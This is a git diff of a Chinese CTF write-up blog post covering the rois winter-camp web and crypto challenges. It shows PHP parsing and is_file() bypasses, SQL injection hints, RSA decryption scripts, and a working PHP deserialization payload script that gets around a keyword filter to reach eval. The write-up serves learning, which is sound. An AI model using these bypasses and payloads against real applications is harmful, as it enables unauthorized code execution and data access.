+<h4 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220453175.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205220453175</span></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220509263.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205220509263</span></p>
 <p>这题属实是有点小坑</p>
 <p>这个$_SERVER[‘QUERY_STRING’]，经过查询是截取get传参？背后的字符串</p>
 <p>下面的if判断是否传进is_admin这个参数，如果没有就完成变量覆盖</p>
@@ -218,43 +261,213 @@ if (asideStatus !== undefined) {
 <p>但是这边已经好心地先帮你decode了</p>
 <p>后面才知道有php有一个特性，就是会将空格解析为_</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105871192">利用PHP的字符串解析特性绕过Waf_WHOAMIAnony的博客-CSDN博客_php的字符串解析特性</a></p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221201519.png" alt="image-20220205221201519"></p>
-<h4 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221233952.png" alt="image-20220205221233952"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221201519.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205221201519</span></p>
+<h4 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221233952.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205221233952</span></p>
 <p>md5数组绕过</p>
-<h4 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221310685.png" alt="image-20220205221310685"></p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221332540.png" alt="image-20220205221332540"></p>
+<h4 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221310685.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205221310685</span></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221332540.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205221332540</span></p>
 <p>这题就是明确目标：绕过is_file函数</p>
 <p>查询到文章</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/261379.html">和开发斗智斗勇的日常：PHP is_file()函数绕过 - FreeBuf网络安全行业门户</a></p>
 <p>创造一个不存在路径就可以绕过</p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221557365.png" alt="image-20220205221557365"></p>
-<h4 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221640928.png" alt="image-20220205221640928"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221557365.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205221557365</span></p>
+<h4 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221640928.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205221640928</span></p>
 <p>万能密码</p>
-<h4 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221707108.png" alt="image-20220205221707108"></p>
+<h4 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221707108.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205221707108</span></p>
 <p>简单的报错查询注入即可</p>
-<h4 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221735035.png" alt="image-20220205221735035"></p>
+<h4 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221735035.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205221735035</span></p>
 <p>题目</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kitten</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $friend;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$word</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$name = $word;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">meow</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Meow~ My name is &quot;</span> . <span class="keyword">$this</span>-&gt;$name . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">findFriend</span>(<span class="params">$sleepingKitten</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;friend = unserialize($sleepingKitten);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Witch</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $incantation;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;incantation);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Witch&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$sleepingKitten</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/incantation/i&quot;</span>, $sleepingKitten)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;h3&gt;Witchcraft is NOT ALLOWED!&lt;h3&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pusheen = <span class="keyword">new</span> Kitten(<span class="string">&quot;pusheen&quot;</span>);</span><br><span class="line">$pusheen-&gt;meow();</span><br><span class="line">$sleepingKitten = base64_decode($_POST[<span class="string">&quot;friend&quot;</span>]);</span><br><span class="line">check($sleepingKitten);</span><br><span class="line">$pusheen-&gt;findFriend($sleepingKitten);</span><br><span class="line">$pusheen-&gt;friend-&gt;meow();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>分析一下代码</p>
 <p>最后要成功触发tostring方法执行eval函数才会输出flag</p>
 <p>贴上payload脚本</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Witch</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $incantation = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kitten</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $friend;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$name = <span class="keyword">new</span> Witch();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;friend = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b = serialize(<span class="keyword">new</span> Kitten());</span><br><span class="line">$b = str_replace(<span class="string">&quot;s:18&quot;</span>, <span class="string">&quot;S:18&quot;</span>, $b);</span><br><span class="line">$b = str_replace(<span class="string">&quot;incantation&quot;</span>, <span class="string">&quot;\\69ncantat\\69on&quot;</span>, $b);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($b);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Witch</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $incantation = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kitten</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $friend;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$name = <span class="keyword">new</span> Witch();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;friend = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b = serialize(<span class="keyword">new</span> Kitten());</span><br><span class="line">$b = str_replace(<span class="string">&quot;s:18&quot;</span>, <span class="string">&quot;S:18&quot;</span>, $b);<span class="comment">//表示字符类型的s大写时，会被当16进制解析</span></span><br><span class="line">$b = str_replace(<span class="string">&quot;incantation&quot;</span>, <span class="string">&quot;\\69ncantat\\69on&quot;</span>, $b);<span class="comment">//运用16进制绕过字符过滤</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode($b);</span><br></pre></td></tr></table></figure>
 
-<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222140518.png" alt="image-20220205222140518"></p>
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222140518.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205222140518</span></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; 98076983780120527792770458890688780277555823887994682214163454666075869521826187406254142075354923691219183496475686028848162360931603330874280505123843552372958293491848353122538774273040195483023876976399815394023691848915634977595301613954470455946398168537308640467440726111280710149870545973093090456889</span><br><span class="line">q &#x3D; 109128821261524367993374364036752312900012076309330756131518403621847420955028710012028358702633852630087399851151754849147220171122637334312693362040478478695565880745177002757742893966644802468111652889172842876540303217969414827643680547263729238638892692735875504393903671278190481143453326533644387573461</span><br><span class="line">c &#x3D; 8696776091045108490706741201669649821552098817481485617853249715695452117022972197749187352644944365460751251101372390508596189150805218655222108412326856187627845335538773557544760562801719469076203277592589287193986370203119805644848355844583928832131820820974656892977022368839425335996903938252794569016614874508025078423755886667955587053802224154129110315695574349620275748114001260456693435229465252466658050265611351185710207338488975143389774529701841231400140833998139253918045998745339223155390778692014423596594980230369885048851010327175679107067569282667999861554443225979013382555032561744321517672718</span><br></pre></td></tr></table></figure>
 
 <p>py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">c,e,p,q</span>):</span></span><br><span class="line">	L=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">	d=gmpy2.invert(e,L)</span><br><span class="line">	n=p*q</span><br><span class="line">	m=gmpy2.powmod(c,d,n)</span><br><span class="line">	flag=str(m)</span><br><span class="line">	print(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">	print(long_to_bytes(m))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	p = <span class="number">98076983780120527792770458890688780277555823887994682214163454666075869521826187406254142075354923691219183496475686028848162360931603330874280505123843552372958293491848353122538774273040195483023876976399815394023691848915634977595301613954470455946398168537308640467440726111280710149870545973093090456889</span></span><br><span class="line">	q = <span class="number">109128821261524367993374364036752312900012076309330756131518403621847420955028710012028358702633852630087399851151754849147220171122637334312693362040478478695565880745177002757742893966644802468111652889172842876540303217969414827643680547263729238638892692735875504393903671278190481143453326533644387573461</span></span><br><span class="line">	e = <span class="number">0x10001</span></span><br><span class="line">	c = <span class="number">8696776091045108490706741201669649821552098817481485617853249715695452117022972197749187352644944365460751251101372390508596189150805218655222108412326856187627845335538773557544760562801719469076203277592589287193986370203119805644848355844583928832131820820974656892977022368839425335996903938252794569016614874508025078423755886667955587053802224154129110315695574349620275748114001260456693435229465252466658050265611351185710207338488975143389774529701841231400140833998139253918045998745339223155390778692014423596594980230369885048851010327175679107067569282667999861554443225979013382555032561744321517672718</span></span><br><span class="line">	Decrypt(c,e,p,q)</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222341034.png" alt="image-20220205222341034"></p>
+<h4 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222341034.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205222341034</span></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 83283614719107534991800643035912480346726823839289209334614767173634111928391</span><br><span class="line">c &#x3D; 70586109384880981913502819444082705449386947354232744667244143211827298034941</span><br></pre></td></tr></table></figure>
 
 <p>py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding= utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">83283614719107534991800643035912480346726823839289209334614767173634111928391</span></span><br><span class="line">c = <span class="number">70586109384880981913502819444082705449386947354232744667244143211827298034941</span></span><br><span class="line"><span class="comment">#1.将n分解为p和q</span></span><br><span class="line">p = <span class="number">284434381548437927107267673531343782677</span></span><br><span class="line">q = <span class="number">292804316643150613089811685591944680683</span></span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#2.求d</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment">#3.m=pow(c,d,n)</span></span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line">flag=str(m)</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">print(binascii.unhexlify(hex(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#binascii.unhexlify(hexstr):从十六进制字符串hexstr返回二进制数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">4v1d</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://daweitech.github.io/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/">http://daweitech.github.io/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=null" async="async"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/10/2022/2/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">网鼎杯2020玄武组-SSRFMe</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/20/2022/1/notes/"><img class="next-cover" src="/imgr/JxEsC+ai.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Notes</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/10/19/2021/ctf/陇剑杯/" title="陇剑杯复现"><img class="cover" src="/imgr/23.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-19</div><div class="title">陇剑杯复现</div></div></a></div><div><a href="/2021/10/25/2021/ctf/Dasctf x Jlenu/" title="Dasctf x Jlenu"><img class="cover" src="/imgr/24.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-25</div><div class="title">Dasctf x Jlenu</div></div></a></div><div><a href="/2021/11/17/2021/ctf/湖湘杯/" title="湖湘杯"><img class="cover" src="/imgr/22.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-17</div><div class="title">湖湘杯</div></div></a></div><div><a href="/2021/10/17/2021/ctf/鲲鹏杯/" title="鲲鹏杯小结"><img class="cover" src="/imgr/22.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-17</div><div class="title">鲲鹏杯小结</div></div></a></div><div><a href="/2021/10/10/2021/ctf/鹤城杯/" title="2021鹤城杯"><img class="cover" src="/imgr/13.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-10</div><div class="title">2021鹤城杯</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/87.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">4v1d</div><div class="author-info__description">Don't cry because it is over, smile because it happened.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">83</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/daweitech"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/daweitech" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:daweitech@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atmo.xml" target="_blank" title=""><i class="fas fa-rss"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">What can not give up , what also can not change.</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-number">1.2.</span> <span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3"><span class="toc-number">1.3.</span> <span class="toc-text">3.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4"><span class="toc-number">1.4.</span> <span class="toc-text">4.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5"><span class="toc-number">1.5.</span> <span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6"><span class="toc-number">1.6.</span> <span class="toc-text">6.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7"><span class="toc-number">1.7.</span> <span class="toc-text">7.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8"><span class="toc-number">1.8.</span> <span class="toc-text">8.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9"><span class="toc-number">1.9.</span> <span class="toc-text">9.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10"><span class="toc-number">1.10.</span> <span class="toc-text">10.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11"><span class="toc-number">1.11.</span> <span class="toc-text">11.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1"><span class="toc-number">2.1.</span> <span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1"><span class="toc-number">2.2.</span> <span class="toc-text">2.</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/02/10/2022/2/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/" title="网鼎杯2020玄武组-SSRFMe"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网鼎杯2020玄武组-SSRFMe"/></a><div class="content"><a class="title" href="/2022/02/10/2022/2/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/" title="网鼎杯2020玄武组-SSRFMe">网鼎杯2020玄武组-SSRFMe</a><time datetime="2022-02-10T12:35:03.000Z" title="Created 2022-02-10 20:35:03">2022-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/" title="rois-冬令营"><img 